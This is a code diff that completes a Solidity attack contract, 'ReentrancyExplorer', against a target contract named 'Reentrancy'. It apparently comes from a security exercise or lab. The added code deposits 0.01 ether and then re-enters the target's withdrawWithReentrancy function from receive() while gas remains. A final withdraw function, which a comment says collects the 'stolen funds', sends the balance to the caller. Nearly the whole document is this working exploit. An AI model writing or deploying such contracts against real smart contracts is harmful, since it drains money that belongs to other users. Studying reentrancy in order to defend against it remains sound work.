@@ -4,26 +4,29 @@ pragma solidity 0.8.17;
 import "./Reentrancy.sol";
 
 contract ReentrancyExplorer {
-
-    Reentrancy targetContract;
+    Reentrancy immutable targetContract;
 
     constructor(address targetContract_) {
-targetContract = Reentrancy(targetContract_);
+        targetContract = Reentrancy(targetContract_);
     }
 
-    depositToTarget() payable {
-targetContract.deposit();
+    function firstStep() external payable {
+        require(msg.value == 0.01 ether, "invalid amount");
+        targetContract.deposit{value: msg.value}();
     }
 
-    exploreTarget() {
-targetContract.
+    function secondStep() public {
+        if (gasleft() > 2300) {
+            targetContract.withdrawWithReentrancy(0.01 ether);
+        }
     }
 
-    fallback() payable {
-
+    receive() external payable {
+        secondStep();
     }
 
-    withdraw() {
-        msg.sender.transfer(address(this.balance));
+    // after attack finished the exploiter will withdraw stolen funds
+    function withdraw() external {
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
